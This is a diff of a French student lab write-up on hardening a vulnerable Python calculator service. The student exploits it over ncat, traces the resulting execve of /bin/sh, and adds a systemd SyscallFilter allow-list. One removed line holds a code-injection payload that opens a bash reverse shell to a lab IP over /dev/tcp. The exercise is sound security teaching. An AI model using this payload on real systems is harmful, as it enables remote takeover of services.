@@ -43,9 +43,11 @@ sudo systemctl daemon-reload
 
 🌞 **Vous devez pouvoir utiliser l'application normalement :**
 
-- démarrage de l'application avec `sudo systemctl start calculatrice`
-- vous pouvez vous connecter depuis votre PC
-- l'affichage de l'application est disponible dans les logs : `journalctl -xe -u calculatrice`
+```
+PS C:\Users\antoi> ncat 192.168.254.4 13337
+
+Hello e
+```
 
 🌞 **Hack l'application**
 
@@ -63,7 +65,7 @@ Vicime
 ```
 PS C:\Users\antoi> ncat 192.168.254.4 13337
 
-Hello __import__('os').system('bash -i >& /dev/tcp/192.168.254.1/4242 0>&1')
+Hello e
 ```
 
 🌞 **Prouvez que le service s'exécute actuellement en `root`**
@@ -160,11 +162,15 @@ strace: Process 1932 detached
 
 🌞 **Tracez l'exécution de l'application : hack**
 
-- idem, mais pendant que vous exploitez la vulnérabilité
-- vous voyez un ou plusieurs syscalls en plus ? Si oui, lesquels ?
+```
+8155 16:07:40.651581617 0 python3 (1674.1674) > execve filename=/bin/sh
+```
+
+Et en regardant les syscall de l'utilisateur `calculatrice`:
+![stratoshark](stratoshark-calculatrice.png)
 
 🌞 **Adaptez le `.service`**
 
-- ajoutez un filtrage des *syscalls* dans le fichier `calculatrice.service`
-- vérifiez que l'exploitation est devenue plus compliquée
-
+```bash
+SyscallFilter=read close fstat lseek mmap mprotect munmap brk rt_sigaction ioctl pread64 access dup socket bind listen getsockname setsockopt fcntl readlink sysinfo getuid getgid geteuid getegid arch_prctl futex getdents64 set_tid_address openat newfstatat set_robust_list accept4 epoll_create1 prlimit64 getrandom rseq
+```
